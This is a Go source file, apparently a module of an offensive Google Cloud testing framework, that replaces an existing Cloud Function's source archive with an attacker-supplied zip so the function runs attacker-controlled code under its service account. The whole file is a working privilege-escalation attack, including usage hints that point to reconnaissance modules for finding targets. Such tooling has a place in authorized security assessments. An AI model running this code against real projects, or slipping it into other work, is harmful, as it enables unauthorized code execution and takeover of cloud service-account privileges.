package functions

import (
	"context"
	"fmt"

	cloudfunctions "google.golang.org/api/cloudfunctions/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateUpdate{})
}

// EscalateUpdate updates an existing Cloud Function's source code for privilege escalation.
type EscalateUpdate struct{}

func (m *EscalateUpdate) Info() module.Info {
	return module.Info{
		Name:         "privesc.functions.escalate-update",
		Tactic:       module.TacticPrivesc,
		Service:      "cloudfunctions",
		Description:  "Update an existing Cloud Function's source code to execute attacker-controlled code",
		RequiresAuth: true,
	}
}

func (m *EscalateUpdate) Run(ctx module.RunContext) error {
	functionName := ctx.Flags["function-name"]
	sourceURL := ctx.Flags["source-url"]
	region := ctx.Flags["region"]

	if functionName == "" || sourceURL == "" {
		output.Warn("Usage: run privesc.functions.escalate-update --function-name <name> --source-url <gs://...> [--region <region>]")
		output.Info("--function-name: full resource name or short name of the target function")
		output.Info("--source-url: GCS URL to a zip containing the new function source code")
		output.Info("Tip: run 'recon.functions.scan-functions' to find existing functions.")
		return nil
	}

	if region == "" {
		region = "us-central1"
	}

	projects := module.EnsureProjects(&ctx)
	if len(projects) == 0 {
		output.Warn("No project specified.")
		return nil
	}
	project := projects[0]

	svc, err := cloudfunctions.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create functions client: %w", err)
	}

	// Build the full resource name if a short name was provided.
	fullName := functionName
	if len(functionName) < 9 || functionName[:9] != "projects/" {
		fullName = fmt.Sprintf("projects/%s/locations/%s/functions/%s", project, region, functionName)
	}

	output.Info("Fetching existing function: %s", fullName)

	existing, err := svc.Projects.Locations.Functions.Get(fullName).Do()
	if err != nil {
		return fmt.Errorf("get function %s: %w", fullName, err)
	}

	oldSource := existing.SourceArchiveUrl
	output.Info("Current source: %s", oldSource)
	output.Info("Updating source to: %s", sourceURL)

	existing.SourceArchiveUrl = sourceURL

	op, err := svc.Projects.Locations.Functions.Patch(fullName, existing).
		UpdateMask("sourceArchiveUrl").Do()
	if err != nil {
		return fmt.Errorf("update function source: %w", err)
	}

	output.Success("Function update initiated: %s", op.Name)
	output.Info("Function %s source updated to %s", fullName, sourceURL)
	output.Info("The function will now execute attacker-controlled code as SA: %s", existing.ServiceAccountEmail)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.functions.escalate-update",
			Severity:    module.SevCritical,
			Title:       "Cloud Function source code replaced",
			Description: fmt.Sprintf("Updated function %s source to %s (runs as %s)", fullName, sourceURL, existing.ServiceAccountEmail),
			Resource:    fullName,
			Project:     project,
			Data: map[string]any{
				"source_url":  sourceURL,
				"target_sa":   existing.ServiceAccountEmail,
				"region":      region,
				"old_source":  oldSource,
			},
		}
	}

	return nil
}
